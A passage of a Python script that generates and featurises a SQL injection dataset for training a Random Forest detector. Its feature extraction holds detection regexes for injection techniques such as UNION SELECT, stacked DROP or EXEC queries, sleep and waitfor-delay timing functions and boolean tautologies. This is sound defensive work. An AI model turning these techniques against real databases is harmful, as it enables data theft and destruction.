    counts = Counter(text)
    total = len(text)
    return -sum((count / total) * math.log2(count / total) for count in counts.values())


def count_regex(pattern: str, text: str) -> int:
    return len(re.findall(pattern, text, flags=re.IGNORECASE))


def extract_features(query: str) -> Dict[str, float]:
    lower = query.lower()
    length = len(query)
    safe_len = max(length, 1)
    encoded_count = count_regex(r"%[0-9a-f]{2}", query)
    keyword_counts = {f"kw_{kw.replace('.', '_')}": lower.count(kw) for kw in SQL_KEYWORDS}
    features: Dict[str, float] = {
        "length": length,
        "entropy": round(shannon_entropy(query), 6),
        "digits": sum(ch.isdigit() for ch in query),
        "letters": sum(ch.isalpha() for ch in query),
        "spaces": sum(ch.isspace() for ch in query),
        "pct_digits": sum(ch.isdigit() for ch in query) / safe_len,
        "pct_letters": sum(ch.isalpha() for ch in query) / safe_len,
        "single_quotes": query.count("'"),
        "double_quotes": query.count('"'),
        "semicolons": query.count(";"),
        "commas": query.count(","),
        "parentheses": query.count("(") + query.count(")"),
        "operators": sum(query.count(op) for op in ["=", "<", ">", "!", "|", "&", "^"]),
        "comment_markers": count_regex(r"(--|#|/\*|\*/|%23|%2d%2d)", query),
        "url_encoded_tokens": encoded_count,
        "hex_literals": count_regex(r"0x[0-9a-f]+", query),
        "wide_byte_tokens": count_regex(r"(%df|%81|%aa|%c0)", query),
        "slash_count": query.count("/") + query.count("\\"),
        "has_json_shape": 1 if re.search(r"^\s*[\{\[]|\"\w+\"\s*:", query) else 0,
        "has_sql_comment": 1 if re.search(r"(--|#|/\*|\*/)", query) else 0,
        "has_url_encoding": 1 if encoded_count else 0,
        "has_boolean_pattern": 1 if re.search(r"(?i)(\bor\b|\band\b|\|\||&&)\s+.{0,40}(=|like|>|<)", query) else 0,
        "has_stacked_query": 1 if re.search(r"(?i);\s*(select|insert|update|delete|drop|exec|declare|call|begin|create|alter|truncate)", query) else 0,
        "has_time_func": 1 if re.search(r"(?i)(sleep\s*\(|pg_sleep|waitfor\s+delay|benchmark\s*\(|dbms_lock\.sleep)", query) else 0,
        "has_union_select": 1 if re.search(r"(?i)\bunion\b\s+(?:all\s+)?\bselect\b", query) else 0,
        "max_token_len": max((len(token) for token in re.split(r"\W+", query) if token), default=0),
        "punctuation_ratio": sum(ch in string.punctuation for ch in query) / safe_len,
    }
    features.update(keyword_counts)
    features["suspicious_score"] = (
        features["has_union_select"] * 4
        + features["has_time_func"] * 4
        + features["has_stacked_query"] * 4
        + features["has_boolean_pattern"] * 3
        + min(features["comment_markers"], 3)
        + min(features["url_encoded_tokens"], 5) * 0.5
        + min(features["single_quotes"] + features["double_quotes"], 6) * 0.4
    )
    return features


def write_raw(path: Path, records: Sequence[Record]) -> None:
    with path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["query", "label", "attack_type", "source"])
        writer.writerows(records)


def write_features(path: Path, records: Sequence[Record]) -> None:
    feature_rows = [extract_features(query) for query, _, _, _ in records]
    feature_names = sorted(feature_rows[0].keys()) if feature_rows else []
    with path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["label", *feature_names])
        for record, features in zip(records, feature_rows):
            _, label, _, _ = record
            writer.writerow([label, *[features[name] for name in feature_names]])


def write_coverage_report(path: Path, records: Sequence[Record], min_per_type: int) -> List[str]:
    by_type = Counter(attack_type for _, label, attack_type, _ in records if label == 1)
    missing_or_low: List[str] = []
    with path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["attack_type", "category", "dialect", "context", "count", "coverage_status"])
        for attack_type in ATTACK_TYPES:
            category, dialect, context = ATTACK_TAXONOMY[attack_type]
            count = by_type.get(attack_type, 0)
            status = "covered" if count >= min_per_type else "low_or_missing"
            if status != "covered":
                missing_or_low.append(attack_type)
            writer.writerow([attack_type, category, dialect, context, count, status])
    return missing_or_low


def print_summary(records: Sequence[Record]) -> None:
    by_label = Counter(label for _, label, _, _ in records)
    by_type = Counter(attack_type for _, _, attack_type, _ in records)
    by_category = Counter(ATTACK_TAXONOMY[attack_type][0] for _, label, attack_type, _ in records if label == 1 and attack_type in ATTACK_TAXONOMY)
    by_source = Counter(source for _, _, _, source in records)
    print("\nDataset summary")
    print(f"  rows: {len(records)}")
    print(f"  labels: {dict(sorted(by_label.items()))}")
    print(f"  taxonomy attack types: {len(ATTACK_TYPES)}")
    print(f"  covered taxonomy attack types: {sum(1 for name in ATTACK_TYPES if by_type.get(name, 0) > 0)}")
    print("  categories:")
    for name, count in sorted(by_category.items()):
        print(f"    {name}: {count}")
    print("  attack types:")
    for name, count in by_type.most_common():
        print(f"    {name}: {count}")
    print("  top sources:")
    for name, count in by_source.most_common(8):
        print(f"    {name}: {count}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Generate a SQL injection dataset for Random Forest training.")
    parser.add_argument("--out", default="sqli_rf_dataset.csv", help="Raw dataset CSV path.")
    parser.add_argument("--features-out", default="sqli_rf_features.csv", help="Numeric feature CSV path.")
    parser.add_argument("--coverage-out", default="sqli_coverage_report.csv", help="Coverage report CSV path.")
    parser.add_argument("--per-type", type=int, default=800, help="Synthetic malicious samples per attack type.")
    parser.add_argument("--benign", type=int, default=8000, help="Synthetic benign sample count.")
    parser.add_argument("--min-coverage-per-type", type=int, default=None, help="Minimum rows required per taxonomy attack type. Defaults to --per-type.")
    parser.add_argument("--seed", type=int, default=42, help="Random seed.")
    parser.add_argument("--no-existing", action="store_true", help="Do not merge local existing CSV/TXT datasets.")
    parser.add_argument(
        "--existing-cap-per-label",
        type=int,
        default=12000,
        help="Maximum existing rows to keep per label before de-duplication. Use 0 for no cap.",
    )
    parser.add_argument("--shuffle", action="store_true", default=True, help="Shuffle final rows.")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    rng = random.Random(args.seed)
    root = Path.cwd()

    records: List[Record] = []
    records.extend(generate_attacks(args.per_type, rng))
    records.extend(generate_benign(args.benign, rng))

    if not args.no_existing:
        existing = load_existing(root, args.existing_cap_per_label, rng)
        print(f"Loaded {len(existing)} existing rows before final de-duplication.")
        records.extend(existing)

    records = dedupe_records(records, prefer_synthetic=True)
    if args.shuffle:
        rng.shuffle(records)

    out = Path(args.out)
    features_out = Path(args.features_out)
    coverage_out = Path(args.coverage_out)
    min_coverage = args.per_type if args.min_coverage_per_type is None else args.min_coverage_per_type
    write_raw(out, records)
    write_features(features_out, records)
    missing_or_low = write_coverage_report(coverage_out, records, min_coverage)
    print_summary(records)
    print(f"\nWrote raw dataset: {out.resolve()}")
    print(f"Wrote RF feature dataset: {features_out.resolve()}")
    print(f"Wrote coverage report: {coverage_out.resolve()}")
    if missing_or_low:
        raise SystemExit(f"Coverage check failed for {len(missing_or_low)} attack types: {', '.join(missing_or_low[:12])}")


if __name__ == "__main__":
    main()
